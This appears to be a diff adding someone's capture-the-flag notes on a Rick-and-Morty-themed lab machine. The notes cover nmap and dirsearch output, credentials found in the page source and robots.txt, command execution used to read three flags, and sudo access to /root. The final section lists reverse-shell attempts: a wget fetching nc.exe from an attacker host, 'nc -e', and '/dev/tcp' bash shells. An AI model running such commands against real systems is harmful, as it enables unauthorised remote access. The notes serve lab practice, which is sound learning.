@@ -1,0 +1,84 @@
+export ip='10.10.184.149'
+
+nmap 
+	nmap -sCV 10.10.184.149 | tee nmapscan.txt
+					PORT   STATE SERVICE VERSION
+					22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+					|ssh-hostkey: 
+					|   2048 83:74:2e:38:41:73:0a:a1:8e:18:cd:99:fc:42:95:6b (RSA)
+					|   256 4f:fe:dd:15:96:00:6e:f7:62:63:56:d5:ec:ec:ca:f3 (ECDSA)
+					|_  256 87:33:4d:72:46:34:3c:f3:d3:8f:0e:60:9e:8e:c6:e3 (ED25519)
+					80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+					|_http-title: Rick is sup4r cool
+					|_http-server-header: Apache/2.4.18 (Ubuntu)
+					Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+					
+view page source 
+	    Username: R1ckRul3s
+	    password (robots.txt) : Wubbalubbadubdub 
+enumeration
+	dirsearch -u http://10.10.184.149/ 
+			[15:08:52] 200 -    2KB - /assets/                                          
+			[15:08:52] 301 -  315B  - /assets  ->  http://10.10.184.149/assets/
+			[15:09:38] 200 -    1KB - /index.html                                       
+			[15:09:51] 200 -  882B  - /login.php                                        
+			[15:10:22] 200 -   17B  - /robots.txt 
+						Wubbalubbadubdub
+		
+	enum4linux 
+		enum4linux -u $ip 
+		/usr/share/enum4linux/enum4linux.pl -a 10.10.184.149
+			[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.
+			
+LOGIN.PHP
+	username : R1ckRul3s
+	password : Wubbalubbadubdub
+	
+	
+TASK 1
+		ls 
+			Sup3rS3cretPickl3Ingred.txt
+			assets
+			clue.txt
+			denied.php
+			index.html
+			login.php
+			portal.php
+			robots.txt
+		cat Sup3rS3cretPickl3Ingred.txt
+			error
+		http://10.10.184.149/Sup3rS3cretPickl3Ingred.txt
+			mr. meeseek hair
+TASK 2
+		cd ../../../../;ls -la;pwd
+		cd /home ;ls -la ;pwd
+		cd /home/rick ;ls -la ;pwd
+		less /home/rick/"second ingredient"
+			1 jerry tear
+	
+TASK 3
+		sudo -l (checking for root permisiions)
+		sudo ls /root
+		sudo less /root/3rd.txt
+		3rd ingredients: fleeb juice
+		
+		
+trying reverse shell
+
+		pythons -m http.server 
+		sudo wget http://10.17.81.162/nc.exe
+		nc.exe 10.10.184.149 444 -e sh
+		
+		tried:
+		sh -i >& /dev/tcp/10.10.184.149/4444 0>&1 / did not work 
+		bash -i >& /dev/tcp/10.10.184.149/4444 0>&1 / did not work
+		nc -e /bin/sh 10.10.184.149 4444
+		
+		
+		
+
+			
+		
+		
+			
+		
